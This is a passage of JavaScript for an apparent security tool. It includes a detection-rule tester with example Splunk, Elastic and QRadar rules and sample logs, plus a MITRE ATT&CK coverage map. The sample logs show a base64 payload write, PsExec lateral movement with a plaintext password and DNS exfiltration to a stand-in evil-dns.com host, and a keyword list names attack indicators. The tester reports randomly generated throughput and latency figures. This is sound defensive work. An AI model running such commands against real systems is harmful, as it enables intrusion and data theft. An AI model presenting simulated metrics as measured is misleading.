2026-03-29T15:05:15 EventID=4688 Process=powershell.exe CommandLine="powershell.exe -Command [Convert]::FromBase64String('TVqQA...')|Set-Content -Path payload.exe -Encoding Byte" ParentProcessName=svchost.exe Computer=SRV01 Account=NT AUTHORITY\\SYSTEM`
    },
    'Elastic - Lateral Movement via PsExec': {
        platform: 'elastic',
        rule: `process where event.type == "start" and
  process.name : ("psexec.exe", "psexec64.exe", "paexec.exe") and
  process.args : ("\\\\*", "-s", "-accepteula")`,
        logs: `{"@timestamp":"2026-03-29T16:01:00Z","event":{"type":"start","category":"process"},"process":{"name":"psexec64.exe","args":["-accepteula","\\\\DC01","-s","cmd.exe"],"pid":4812},"user":{"name":"admin"},"host":{"name":"WS042"}}
{"@timestamp":"2026-03-29T16:01:30Z","event":{"type":"start","category":"process"},"process":{"name":"calc.exe","args":[],"pid":5100},"user":{"name":"jsmith"},"host":{"name":"WS010"}}
{"@timestamp":"2026-03-29T16:02:00Z","event":{"type":"start","category":"process"},"process":{"name":"paexec.exe","args":["\\\\SRV02","-s","-u","admin","-p","P@ss1","cmd.exe"],"pid":6001},"user":{"name":"admin"},"host":{"name":"WS042"}}
{"@timestamp":"2026-03-29T16:03:00Z","event":{"type":"start","category":"process"},"process":{"name":"notepad.exe","args":["readme.txt"],"pid":7200},"user":{"name":"jdoe"},"host":{"name":"WS015"}}
{"@timestamp":"2026-03-29T16:04:00Z","event":{"type":"start","category":"process"},"process":{"name":"psexec.exe","args":["\\\\FILE01","ipconfig","/all"],"pid":8010},"user":{"name":"svc_deploy"},"host":{"name":"JUMP01"}}`
    },
    'QRadar AQL - Data Exfiltration via DNS': {
        platform: 'qradar',
        rule: `SELECT sourceip, "DNS Domain", COUNT(*) as QueryCount, SUM(eventcount) as TotalEvents
FROM events
WHERE category = 'DNS'
AND LENGTH("DNS Domain") > 50
GROUP BY sourceip, "DNS Domain"
HAVING QueryCount > 100
LAST 1 HOURS`,
        logs: `2026-03-29T17:00:01 category=DNS sourceip=10.0.3.100 "DNS Domain"="aGVsbG8gd29ybGQgdGhpcyBpcyBhIGRhdGEgZXhmaWx0cmF0aW9u.c2.evil-dns.com" eventcount=1
2026-03-29T17:00:02 category=DNS sourceip=10.0.3.100 "DNS Domain"="dGhlIHF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5.c2.evil-dns.com" eventcount=1
2026-03-29T17:00:03 category=DNS sourceip=10.0.1.50 "DNS Domain"="google.com" eventcount=1
2026-03-29T17:00:04 category=DNS sourceip=10.0.3.100 "DNS Domain"="ZG9nIHRoaXMgaXMgZW5jb2RlZCBkYXRhIGJlaW5nIGV4ZmlsdHJh.c2.evil-dns.com" eventcount=1
2026-03-29T17:00:05 category=DNS sourceip=10.0.2.25 "DNS Domain"="microsoft.com" eventcount=1
2026-03-29T17:00:06 category=DNS sourceip=10.0.3.100 "DNS Domain"="dGVkIG92ZXIgRE5TIHRoaXMgaXMgYSBjb21tb24gdGVjaG5pcXVl.c2.evil-dns.com" eventcount=1`
    }
};

function _simulateRuleTest(platform, rule, logs) {
    const logLines = logs.trim().split('\n');
    const results = [];
    const ruleTerms = [];

    // Extract search terms from rule
    const patterns = [
        /EventCode=(\d+)/gi, /EventID\s*==?\s*(\d+)/gi,
        /has\s+"([^"]+)"/gi, /has_any\s*\(([^)]+)\)/gi,
        /process\.name\s*:\s*\(([^)]+)\)/gi, /process\.name\s*:\s*"([^"]+)"/gi,
        /"([^"]+)"/g, /=\s*'([^']+)'/g,
        /category\s*=\s*'([^']+)'/gi, /LENGTH\([^)]+\)\s*>\s*(\d+)/gi
    ];

    const ruleLower = rule.toLowerCase();
    // Extract meaningful terms
    const termMatches = rule.match(/"([^"]+)"|'([^']+)'|==?\s*(\d+)/g) || [];
    termMatches.forEach(t => {
        const clean = t.replace(/['"=\s]/g, '');
        if (clean.length > 1) ruleTerms.push(clean.toLowerCase());
    });

    // Add specific keywords from the rule
    const keywords = ['4625', '4688', 'powershell', 'psexec', 'dns', '-enc', '-nop', 'hidden', 'downloadstring',
        'invoke-expression', 'bypass', 'frombase64', 'psexec.exe', 'psexec64.exe', 'paexec.exe', 'accepteula'];
    keywords.forEach(kw => {
        if (ruleLower.includes(kw)) ruleTerms.push(kw);
    });

    // Also check for LENGTH > N pattern for DNS exfiltration
    const lengthMatch = rule.match(/LENGTH\([^)]+\)\s*>\s*(\d+)/i);
    const minLength = lengthMatch ? parseInt(lengthMatch[1]) : null;

    logLines.forEach((line, idx) => {
        const lineLower = line.toLowerCase();
        let matched = false;
        let matchReasons = [];

        ruleTerms.forEach(term => {
            if (lineLower.includes(term)) {
                matched = true;
                matchReasons.push(term);
            }
        });

        // DNS length check
        if (minLength) {
            const domainMatch = line.match(/"DNS Domain"="([^"]+)"/);
            if (domainMatch && domainMatch[1].length > minLength) {
                matched = true;
                matchReasons.push(`domain length > ${minLength}`);
            }
        }

        // For process rules, check process.name patterns
        if (ruleLower.includes('process.name') || ruleLower.includes('process where')) {
            const procNames = ['psexec.exe', 'psexec64.exe', 'paexec.exe'];
            procNames.forEach(pn => {
                if (lineLower.includes(pn)) { matched = true; matchReasons.push(pn); }
            });
        }

        results.push({ line: idx + 1, text: line, matched, reasons: [...new Set(matchReasons)] });
    });

    const matchCount = results.filter(r => r.matched).length;
    const matchRate = ((matchCount / logLines.length) * 100).toFixed(1);

    return {
        results,
        stats: {
            totalLines: logLines.length,
            matchCount,
            matchRate,
            eventsPerSec: _rand(8000, 45000),
            avgLatency: (_rand(1, 50) / 10).toFixed(1)
        }
    };
}

function loadRuleTester() {
    const pc = _showPageContent();
    if (_threatDashboardInterval) { clearInterval(_threatDashboardInterval); _threatDashboardInterval = null; }

    const exampleButtons = Object.keys(_exampleRules).map(name =>
        `<button class="btn-hack" onclick="_loadExampleRule('${name}')" style="font-size:10px;padding:4px 10px">${name}</button>`
    ).join(' ');

    pc.innerHTML = `
        <div style="margin-bottom:24px">
            <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
                <h1 style="margin:0;border:none;padding:0">DETECTION RULE TESTER</h1>
                <span class="card-tag" style="position:static">TESTING</span>
            </div>
            <p style="color:var(--text-secondary);font-size:13px">Test detection rules against sample log data. Paste your rule and logs, select platform, and see simulated match results.</p>
        </div>

        <div class="section-title">&#x27E6; PRE-LOADED EXAMPLES &#x27E7;</div>
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px">${exampleButtons}</div>

        <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px">
            <label style="color:var(--text-secondary);font-size:11px">PLATFORM:</label>
            <select id="rt-platform" style="background:var(--bg-primary);border:1px solid var(--border);color:var(--accent);padding:6px 10px;font-family:var(--font-mono);font-size:11px;border-radius:4px">
                <option value="splunk">Splunk (SPL)</option>
                <option value="sentinel">Microsoft Sentinel (KQL)</option>
                <option value="qradar">IBM QRadar (AQL)</option>
                <option value="elastic">Elastic (EQL/KQL)</option>
                <option value="wazuh">Wazuh (XML)</option>
                <option value="chronicle">Chronicle (YARA-L)</option>
                <option value="crowdstrike">CrowdStrike (FQL)</option>
                <option value="sigma">Sigma (YAML)</option>
            </select>
        </div>

        <div style="display:flex;gap:16px">
            <div style="flex:1">
                <div class="section-title">&#x27E6; DETECTION RULE &#x27E7;</div>
                <textarea id="rt-rule" placeholder="Paste your detection rule here..." style="width:100%;height:180px;background:var(--bg-primary);border:1px solid var(--border);color:var(--accent);padding:12px;font-family:var(--font-mono);font-size:11px;border-radius:4px;resize:vertical;outline:none"></textarea>
            </div>
            <div style="flex:1">
                <div class="section-title">&#x27E6; SAMPLE LOG DATA &#x27E7;</div>
                <textarea id="rt-logs" placeholder="Paste sample log entries here..." style="width:100%;height:180px;background:var(--bg-primary);border:1px solid var(--border);color:var(--text-primary);padding:12px;font-family:var(--font-mono);font-size:11px;border-radius:4px;resize:vertical;outline:none"></textarea>
            </div>
        </div>

        <div style="display:flex;gap:8px;margin:12px 0">
            <button class="btn-hack" onclick="_runRuleTest()">TEST RULE</button>
            <button class="btn-hack" onclick="document.getElementById('rt-rule').value='';document.getElementById('rt-logs').value='';document.getElementById('rt-results').innerHTML=''">CLEAR ALL</button>
        </div>

        <div id="rt-results"></div>
    `;
}

function _loadExampleRule(name) {
    const ex = _exampleRules[name];
    if (!ex) return;
    document.getElementById('rt-platform').value = ex.platform;
    document.getElementById('rt-rule').value = ex.rule;
    document.getElementById('rt-logs').value = ex.logs;
    _runRuleTest();
}

function _runRuleTest() {
    const platform = document.getElementById('rt-platform').value;
    const rule = document.getElementById('rt-rule').value.trim();
    const logs = document.getElementById('rt-logs').value.trim();
    if (!rule || !logs) return;

    const test = _simulateRuleTest(platform, rule, logs);
    const el = document.getElementById('rt-results');

    let html = `
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:16px;margin-bottom:16px">
            <div style="display:flex;gap:24px;align-items:center">
                <div>
                    <div style="font-size:10px;color:var(--text-dim)">TOTAL EVENTS</div>
                    <div style="font-size:20px;color:var(--accent-blue)">${test.stats.totalLines}</div>
                </div>
                <div>
                    <div style="font-size:10px;color:var(--text-dim)">MATCHES</div>
                    <div style="font-size:20px;color:${test.stats.matchCount > 0 ? 'var(--accent-red)' : 'var(--accent)'}">${test.stats.matchCount}</div>
                </div>
                <div>
                    <div style="font-size:10px;color:var(--text-dim)">MATCH RATE</div>
                    <div style="font-size:20px;color:var(--accent-yellow)">${test.stats.matchRate}%</div>
                </div>
                <div>
                    <div style="font-size:10px;color:var(--text-dim)">THROUGHPUT</div>
                    <div style="font-size:20px;color:var(--accent)">${test.stats.eventsPerSec.toLocaleString()} eps</div>
                </div>
                <div>
                    <div style="font-size:10px;color:var(--text-dim)">AVG LATENCY</div>
                    <div style="font-size:20px;color:var(--accent)">${test.stats.avgLatency} ms</div>
                </div>
            </div>
        </div>

        <div class="section-title">&#x27E6; MATCH RESULTS &#x27E7;</div>
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;font-size:11px;line-height:1.6">
    `;

    test.results.forEach(r => {
        const bgColor = r.matched ? 'rgba(255,51,51,0.08)' : 'transparent';
        const borderLeft = r.matched ? '3px solid var(--accent-red)' : '3px solid transparent';
        const lineColor = r.matched ? 'var(--accent-red)' : 'var(--text-dim)';

        let displayText = _esc(r.text);
        if (r.matched) {
            r.reasons.forEach(reason => {
                const re = new RegExp('(' + reason.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');
                displayText = displayText.replace(re, '<span style="background:rgba(255,51,51,0.3);color:#fff;padding:0 2px;border-radius:2px">$1</span>');
            });
        }

        html += `<div style="padding:4px 8px;background:${bgColor};border-left:${borderLeft};margin-bottom:2px;display:flex;gap:8px">
            <span style="color:${lineColor};flex-shrink:0;width:20px;text-align:right">${r.line}</span>
            <span style="color:${r.matched ? 'var(--text-primary)' : 'var(--text-dim)'};white-space:pre-wrap;word-break:break-all">${r.matched ? '&#x25CF; ' : '  '}${displayText}</span>
        </div>`;
    });

    html += `</div>`;
    el.innerHTML = html;
}


// ═══════════════════════════════════════════════════════════════════════════
// 5. MITRE ATT&CK INTERACTIVE MAP
// ═══════════════════════════════════════════════════════════════════════════

const _mitreMatrix = {
    'Reconnaissance': {
        id: 'TA0043',
        techniques: [
            { id: 'T1595', name: 'Active Scanning', subs: ['T1595.001 Scanning IP Blocks', 'T1595.002 Vulnerability Scanning', 'T1595.003 Wordlist Scanning'] },
            { id: 'T1592', name: 'Gather Victim Host Info', subs: ['T1592.001 Hardware', 'T1592.002 Software', 'T1592.004 Client Configurations'] },
            { id: 'T1589', name: 'Gather Victim Identity Info', subs: ['T1589.001 Credentials', 'T1589.002 Email Addresses', 'T1589.003 Employee Names'] },
            { id: 'T1590', name: 'Gather Victim Network Info', subs: ['T1590.001 Domain Properties', 'T1590.002 DNS', 'T1590.004 Network Topology'] },
            { id: 'T1591', name: 'Gather Victim Org Info', subs: ['T1591.001 Determine Physical Locations', 'T1591.002 Business Relationships'] },
            { id: 'T1598', name: 'Phishing for Information', subs: ['T1598.001 Spearphishing Service', 'T1598.002 Spearphishing Attachment', 'T1598.003 Spearphishing Link'] }
        ]
    },
    'Resource Development': {
        id: 'TA0042',
        techniques: [
            { id: 'T1583', name: 'Acquire Infrastructure', subs: ['T1583.001 Domains', 'T1583.003 Virtual Private Server', 'T1583.006 Web Services'] },
            { id: 'T1586', name: 'Compromise Accounts', subs: ['T1586.001 Social Media Accounts', 'T1586.002 Email Accounts'] },
            { id: 'T1584', name: 'Compromise Infrastructure', subs: ['T1584.001 Domains', 'T1584.004 Server'] },
            { id: 'T1587', name: 'Develop Capabilities', subs: ['T1587.001 Malware', 'T1587.003 Digital Certificates', 'T1587.004 Exploits'] },
            { id: 'T1585', name: 'Establish Accounts', subs: ['T1585.001 Social Media', 'T1585.002 Email Accounts'] },
            { id: 'T1588', name: 'Obtain Capabilities', subs: ['T1588.001 Malware', 'T1588.002 Tool', 'T1588.005 Exploits', 'T1588.006 Vulnerabilities'] }
        ]
    },
    'Initial Access': {
        id: 'TA0001',
        techniques: [
            { id: 'T1189', name: 'Drive-by Compromise', subs: [] },
            { id: 'T1190', name: 'Exploit Public-Facing App', subs: [] },
            { id: 'T1133', name: 'External Remote Services', subs: [] },
            { id: 'T1200', name: 'Hardware Additions', subs: [] },
            { id: 'T1566', name: 'Phishing', subs: ['T1566.001 Spearphishing Attachment', 'T1566.002 Spearphishing Link', 'T1566.003 Spearphishing via Service'] },
            { id: 'T1091', name: 'Replication Through Removable Media', subs: [] },
            { id: 'T1195', name: 'Supply Chain Compromise', subs: ['T1195.001 Compromise Software Dependencies', 'T1195.002 Compromise Software Supply Chain'] },
            { id: 'T1199', name: 'Trusted Relationship', subs: [] },
            { id: 'T1078', name: 'Valid Accounts', subs: ['T1078.001 Default Accounts', 'T1078.002 Domain Accounts', 'T1078.003 Local Accounts', 'T1078.004 Cloud Accounts'] }
        ]
    },
    'Execution': {
        id: 'TA0002',
        techniques: [
            { id: 'T1059', name: 'Command and Scripting Interpreter', subs: ['T1059.001 PowerShell', 'T1059.003 Windows Command Shell', 'T1059.004 Unix Shell', 'T1059.005 Visual Basic', 'T1059.006 Python', 'T1059.007 JavaScript'] },
            { id: 'T1203', name: 'Exploitation for Client Execution', subs: [] },
            { id: 'T1559', name: 'Inter-Process Communication', subs: ['T1559.001 Component Object Model', 'T1559.002 Dynamic Data Exchange'] },
            { id: 'T1106', name: 'Native API', subs: [] },
            { id: 'T1053', name: 'Scheduled Task/Job', subs: ['T1053.005 Scheduled Task', 'T1053.003 Cron'] },
            { id: 'T1129', name: 'Shared Modules', subs: [] },
            { id: 'T1204', name: 'User Execution', subs: ['T1204.001 Malicious Link', 'T1204.002 Malicious File'] },
            { id: 'T1047', name: 'WMI', subs: [] }
        ]
    },
    'Persistence': {
        id: 'TA0003',
        techniques: [
            { id: 'T1098', name: 'Account Manipulation', subs: ['T1098.001 Additional Cloud Credentials', 'T1098.004 SSH Authorized Keys'] },
            { id: 'T1547', name: 'Boot or Logon Autostart', subs: ['T1547.001 Registry Run Keys', 'T1547.004 Winlogon Helper DLL', 'T1547.009 Shortcut Modification'] },
            { id: 'T1136', name: 'Create Account', subs: ['T1136.001 Local Account', 'T1136.002 Domain Account', 'T1136.003 Cloud Account'] },
            { id: 'T1543', name: 'Create or Modify System Process', subs: ['T1543.002 Systemd Service', 'T1543.003 Windows Service'] },
            { id: 'T1546', name: 'Event Triggered Execution', subs: ['T1546.001 Change Default File Assoc', 'T1546.003 WMI Event Subscription'] },
            { id: 'T1053', name: 'Scheduled Task/Job', subs: ['T1053.005 Scheduled Task'] },
            { id: 'T1505', name: 'Server Software Component', subs: ['T1505.003 Web Shell'] }
        ]
    },
    'Privilege Escalation': {
        id: 'TA0004',
        techniques: [
            { id: 'T1548', name: 'Abuse Elevation Control', subs: ['T1548.002 Bypass UAC', 'T1548.003 Sudo and Sudo Caching'] },
            { id: 'T1134', name: 'Access Token Manipulation', subs: ['T1134.001 Token Impersonation', 'T1134.002 Create Process with Token'] },
            { id: 'T1068', name: 'Exploitation for Privilege Escalation', subs: [] },
            { id: 'T1078', name: 'Valid Accounts', subs: ['T1078.002 Domain Accounts', 'T1078.003 Local Accounts'] },
            { id: 'T1055', name: 'Process Injection', subs: ['T1055.001 DLL Injection', 'T1055.003 Thread Execution Hijacking', 'T1055.012 Process Hollowing'] }
        ]
    },
    'Defense Evasion': {
        id: 'TA0005',
        techniques: [
            { id: 'T1140', name: 'Deobfuscate/Decode Files', subs: [] },
            { id: 'T1070', name: 'Indicator Removal', subs: ['T1070.001 Clear Windows Event Logs', 'T1070.003 Clear Command History', 'T1070.004 File Deletion', 'T1070.006 Timestomp'] },
            { id: 'T1036', name: 'Masquerading', subs: ['T1036.003 Rename System Utilities', 'T1036.005 Match Legitimate Name or Location'] },
            { id: 'T1027', name: 'Obfuscated Files or Info', subs: ['T1027.001 Binary Padding', 'T1027.005 Indicator Removal from Tools'] },
            { id: 'T1562', name: 'Impair Defenses', subs: ['T1562.001 Disable or Modify Tools', 'T1562.002 Disable Windows Event Logging', 'T1562.004 Disable or Modify Firewall'] },
            { id: 'T1218', name: 'System Binary Proxy Execution', subs: ['T1218.005 Mshta', 'T1218.010 Regsvr32', 'T1218.011 Rundll32'] }
        ]
    },
    'Credential Access': {
        id: 'TA0006',
        techniques: [
            { id: 'T1110', name: 'Brute Force', subs: ['T1110.001 Password Guessing', 'T1110.002 Password Cracking', 'T1110.003 Password Spraying', 'T1110.004 Credential Stuffing'] },
            { id: 'T1003', name: 'OS Credential Dumping', subs: ['T1003.001 LSASS Memory', 'T1003.002 SAM', 'T1003.003 NTDS', 'T1003.006 DCSync'] },
            { id: 'T1558', name: 'Steal or Forge Kerberos Tickets', subs: ['T1558.003 Kerberoasting', 'T1558.004 AS-REP Roasting'] },
            { id: 'T1552', name: 'Unsecured Credentials', subs: ['T1552.001 Credentials In Files', 'T1552.004 Private Keys', 'T1552.006 Group Policy Preferences'] },
            { id: 'T1556', name: 'Modify Authentication Process', subs: ['T1556.001 Domain Controller Authentication'] },
            { id: 'T1539', name: 'Steal Web Session Cookie', subs: [] }
        ]
    },
    'Discovery': {
        id: 'TA0007',
        techniques: [
            { id: 'T1087', name: 'Account Discovery', subs: ['T1087.001 Local Account', 'T1087.002 Domain Account', 'T1087.004 Cloud Account'] },
            { id: 'T1482', name: 'Domain Trust Discovery', subs: [] },
            { id: 'T1083', name: 'File and Directory Discovery', subs: [] },
            { id: 'T1046', name: 'Network Service Discovery', subs: [] },
            { id: 'T1135', name: 'Network Share Discovery', subs: [] },
            { id: 'T1057', name: 'Process Discovery', subs: [] },
            { id: 'T1018', name: 'Remote System Discovery', subs: [] },
            { id: 'T1082', name: 'System Information Discovery', subs: [] },
            { id: 'T1016', name: 'System Network Configuration Discovery', subs: [] },
            { id: 'T1580', name: 'Cloud Infrastructure Discovery', subs: [] }
        ]
    },
    'Lateral Movement': {
        id: 'TA0008',
        techniques: [
            { id: 'T1210', name: 'Exploitation of Remote Services', subs: [] },
            { id: 'T1534', name: 'Internal Spearphishing', subs: [] },
            { id: 'T1570', name: 'Lateral Tool Transfer', subs: [] },
            { id: 'T1021', name: 'Remote Services', subs: ['T1021.001 Remote Desktop Protocol', 'T1021.002 SMB/Windows Admin Shares', 'T1021.003 DCOM', 'T1021.004 SSH', 'T1021.006 Windows Remote Management'] },
            { id: 'T1080', name: 'Taint Shared Content', subs: [] },
            { id: 'T1550', name: 'Use Alternate Auth Material', subs: ['T1550.002 Pass the Hash', 'T1550.003 Pass the Ticket'] }
        ]
    },
    'Collection': {
        id: 'TA0009',
        techniques: [
            { id: 'T1560', name: 'Archive Collected Data', subs: ['T1560.001 Archive via Utility'] },
            { id: 'T1123', name: 'Audio Capture', subs: [] },
            { id: 'T1119', name: 'Automated Collection', subs: [] },
            { id: 'T1005', name: 'Data from Local System', subs: [] },
            { id: 'T1039', name: 'Data from Network Shared Drive', subs: [] },
            { id: 'T1025', name: 'Data from Removable Media', subs: [] },
            { id: 'T1074', name: 'Data Staged', subs: ['T1074.001 Local Data Staging', 'T1074.002 Remote Data Staging'] },
            { id: 'T1113', name: 'Screen Capture', subs: [] }
        ]
    },
    'Command and Control': {
        id: 'TA0011',
        techniques: [
            { id: 'T1071', name: 'Application Layer Protocol', subs: ['T1071.001 Web Protocols', 'T1071.003 Mail Protocols', 'T1071.004 DNS'] },
            { id: 'T1132', name: 'Data Encoding', subs: ['T1132.001 Standard Encoding'] },
            { id: 'T1573', name: 'Encrypted Channel', subs: ['T1573.001 Symmetric Cryptography', 'T1573.002 Asymmetric Cryptography'] },
            { id: 'T1008', name: 'Fallback Channels', subs: [] },
            { id: 'T1105', name: 'Ingress Tool Transfer', subs: [] },
            { id: 'T1090', name: 'Proxy', subs: ['T1090.001 Internal Proxy', 'T1090.002 External Proxy', 'T1090.003 Multi-hop Proxy'] },
            { id: 'T1572', name: 'Protocol Tunneling', subs: [] },
            { id: 'T1102', name: 'Web Service', subs: ['T1102.002 Bidirectional Communication'] }
        ]
    },
    'Exfiltration': {
        id: 'TA0010',
        techniques: [
            { id: 'T1020', name: 'Automated Exfiltration', subs: [] },
            { id: 'T1030', name: 'Data Transfer Size Limits', subs: [] },
            { id: 'T1048', name: 'Exfiltration Over Alternative Protocol', subs: ['T1048.001 Exfiltration Over Symmetric Encrypted Non-C2', 'T1048.003 Exfiltration Over Unencrypted Non-C2'] },
            { id: 'T1041', name: 'Exfiltration Over C2 Channel', subs: [] },
            { id: 'T1011', name: 'Exfiltration Over Other Network Medium', subs: [] },
            { id: 'T1052', name: 'Exfiltration Over Physical Medium', subs: ['T1052.001 Exfiltration over USB'] },
            { id: 'T1567', name: 'Exfiltration Over Web Service', subs: ['T1567.002 Exfiltration to Cloud Storage'] },
            { id: 'T1029', name: 'Scheduled Transfer', subs: [] }
        ]
    },
    'Impact': {
        id: 'TA0040',
        techniques: [
            { id: 'T1531', name: 'Account Access Removal', subs: [] },
            { id: 'T1485', name: 'Data Destruction', subs: [] },
            { id: 'T1486', name: 'Data Encrypted for Impact', subs: [] },
            { id: 'T1565', name: 'Data Manipulation', subs: ['T1565.001 Stored Data Manipulation'] },
            { id: 'T1491', name: 'Defacement', subs: ['T1491.001 Internal Defacement', 'T1491.002 External Defacement'] },
            { id: 'T1561', name: 'Disk Wipe', subs: ['T1561.001 Disk Content Wipe', 'T1561.002 Disk Structure Wipe'] },
            { id: 'T1499', name: 'Endpoint Denial of Service', subs: [] },
            { id: 'T1529', name: 'System Shutdown/Reboot', subs: [] },
            { id: 'T1498', name: 'Network Denial of Service', subs: [] },
            { id: 'T1496', name: 'Resource Hijacking', subs: [] }
        ]
    }
};

function _getTechniqueIdsFromRuleDB() {
    const ids = new Set();
    if (typeof ruleDatabase !== 'undefined') {
        ruleDatabase.forEach(rule => {
            if (rule.mitre && rule.mitre.technique) {
                ids.add(rule.mitre.technique.split('.')[0]);
                ids.add(rule.mitre.technique);
            }
        });
    }
    return ids;
}

function _findRuleForTechnique(techId) {
    if (typeof ruleDatabase !== 'undefined') {
        return ruleDatabase.find(r => r.mitre && (r.mitre.technique === techId || r.mitre.technique.startsWith(techId + '.')));
    }
    return null;
}

function loadMitreMap() {
    const pc = _showPageContent();
    if (_threatDashboardInterval) { clearInterval(_threatDashboardInterval); _threatDashboardInterval = null; }

    const coveredTechniques = _getTechniqueIdsFromRuleDB();

    let totalTechniques = 0;
    let detectedTechniques = 0;
    let partialTechniques = 0;

    Object.values(_mitreMatrix).forEach(tactic => {
        tactic.techniques.forEach(tech => {
            totalTechniques++;
            if (coveredTechniques.has(tech.id)) {
                detectedTechniques++;
            } else if (tech.subs.some(s => coveredTechniques.has(s.split(' ')[0]))) {
                partialTechniques++;
            }
        });
    });

    const coveragePct = ((detectedTechniques + partialTechniques * 0.5) / totalTechniques * 100).toFixed(1);

    let matrixHtml = '<div style="overflow-x:auto"><div style="display:flex;gap:2px;min-width:1600px">';

    Object.entries(_mitreMatrix).forEach(([tacticName, tactic]) => {
        matrixHtml += `<div style="flex:1;min-width:110px">
            <div style="background:var(--bg-secondary);border:1px solid var(--border);padding:6px;text-align:center;font-size:9px;color:var(--accent);font-weight:700;border-radius:4px 4px 0 0">${tacticName}<br><span style="color:var(--text-dim)">${tactic.id}</span></div>`;

        tactic.techniques.forEach(tech => {
            let color, bg, status;
            if (coveredTechniques.has(tech.id)) {
                color = '#000'; bg = 'var(--accent)'; status = 'detected';
            } else if (tech.subs.some(s => coveredTechniques.has(s.split(' ')[0]))) {
                color = '#000'; bg = 'var(--accent-yellow)'; status = 'partial';
            } else {
                color = 'var(--text-secondary)'; bg = 'var(--bg-card)'; status = 'none';
            }

            matrixHtml += `<div onclick="_showMitreTechniqueDetail('${tech.id}','${_esc(tech.name)}','${tacticName}')" style="background:${bg};color:${color};border:1px solid var(--border);padding:4px;font-size:8px;cursor:pointer;margin-top:1px;transition:all 0.2s" onmouseover="this.style.transform='scale(1.05)';this.style.zIndex='10'" onmouseout="this.style.transform='scale(1)';this.style.zIndex='1'">
                <div style="font-weight:700">${tech.id}</div>
                <div style="font-size:7px;opacity:0.8">${tech.name}</div>
            </div>`;
        });

        matrixHtml += '</div>';
    });

    matrixHtml += '</div></div>';

    pc.innerHTML = `
        <div style="margin-bottom:24px">
            <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
                <h1 style="margin:0;border:none;padding:0">MITRE ATT&CK INTERACTIVE MAP</h1>
                <span class="card-tag" style="position:static">v15.1</span>
            </div>
            <p style="color:var(--text-secondary);font-size:13px">Full MITRE ATT&CK Enterprise matrix with detection coverage from the rule database. Click any technique for details and detection rules.</p>
        </div>

        <div class="stats-grid" style="grid-template-columns:repeat(4,1fr)">
            <div class="stat-card">
                <div class="stat-number" style="color:var(--accent)">${coveragePct}%</div>
                <div class="stat-label">OVERALL COVERAGE</div>
                <div class="stat-bar"><div class="stat-fill" style="width:${coveragePct}%"></div></div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:var(--accent)">${detectedTechniques}</div>
                <div class="stat-label">DETECTED (GREEN)</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:var(--accent-yellow)">${partialTechniques}</div>
                <div class="stat-label">PARTIAL (YELLOW)</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:var(--accent-red)">${totalTechniques - detectedTechniques - partialTechniques}</div>
                <div class="stat-label">NO COVERAGE (RED)</div>
            </div>
        </div>

        <div style="display:flex;gap:12px;margin:12px 0;align-items:center">
            <span style="font-size:10px;color:var(--text-dim)">LEGEND:</span>
            <span style="font-size:10px;padding:2px 8px;background:var(--accent);color:#000;border-radius:2px">Detected</span>
            <span style="font-size:10px;padding:2px 8px;background:var(--accent-yellow);color:#000;border-radius:2px">Partial</span>
            <span style="font-size:10px;padding:2px 8px;background:var(--bg-card);color:var(--text-secondary);border:1px solid var(--border);border-radius:2px">No Coverage</span>
        </div>

        <div class="section-title">&#x27E6; ATT&CK MATRIX &#x27E7;</div>
        ${matrixHtml}

        <div id="mitre-technique-detail" style="margin-top:16px"></div>
    `;
}

function _showMitreTechniqueDetail(techId, techName, tacticName) {
    const el = document.getElementById('mitre-technique-detail');
    const rule = _findRuleForTechnique(techId);

    const tactic = _mitreMatrix[tacticName];
    const technique = tactic ? tactic.techniques.find(t => t.id === techId) : null;
    const subs = technique ? technique.subs : [];

    let rulesHtml = '';
    if (rule && rule.queries) {
        const platformNames = {
            splunk: 'Splunk (SPL)', sentinel: 'Microsoft Sentinel (KQL)', qradar: 'IBM QRadar (AQL)',
            elastic: 'Elastic SIEM', wazuh: 'Wazuh (XML)', crowdstrike: 'CrowdStrike Falcon',
            cortex_xdr: 'Cortex XDR', sentinelone: 'SentinelOne'
        };
        Object.entries(rule.queries).forEach(([platform, query]) => {
            const name = platformNames[platform] || platform;
            rulesHtml += `<div style="margin-bottom:8px">
                <div style="font-size:10px;color:var(--accent);margin-bottom:2px">${name}</div>
                ${_codeBlock(query, platform)}
            </div>`;
        });
    } else {
        rulesHtml = '<div style="color:var(--text-dim);font-size:12px;padding:8px">No detection rules found in the rule database for this technique. Consider creating rules to improve coverage.</div>';
    }

    el.innerHTML = `
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:20px">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
                <div>
                    <div style="font-size:18px;color:var(--accent-blue)">${techId} - ${techName}</div>
                    <div style="font-size:11px;color:var(--text-dim);margin-top:4px">Tactic: ${tacticName} | ${tactic ? tactic.id : ''}</div>
                </div>
                <span class="card-tag" style="position:static;background:${rule ? 'var(--accent)' : 'var(--accent-red)'};color:#000">${rule ? 'DETECTED' : 'NO COVERAGE'}</span>
            </div>

            ${rule ? `<div style="margin-bottom:12px">
                <div style="font-size:11px;color:var(--text-dim)">DESCRIPTION</div>
                <div style="font-size:12px;margin-top:4px">${rule.description || 'No description available.'}</div>
            </div>` : ''}

            ${subs.length > 0 ? `<div style="margin-bottom:12px">
                <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px">SUB-TECHNIQUES</div>
                ${subs.map(s => `<div style="font-size:11px;padding:2px 0;color:var(--accent-blue)">&#x25B8; ${s}</div>`).join('')}
            </div>` : ''}

            ${rule ? `<div style="margin-bottom:12px">
                <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px">DATA SOURCES</div>
                <div style="display:flex;gap:6px;flex-wrap:wrap">
                    ${(rule.dataSources || []).map(ds => `<span style="font-size:10px;padding:2px 8px;background:var(--bg-secondary);border:1px solid var(--border);border-radius:2px">${ds}</span>`).join('')}
                </div>
            </div>` : ''}

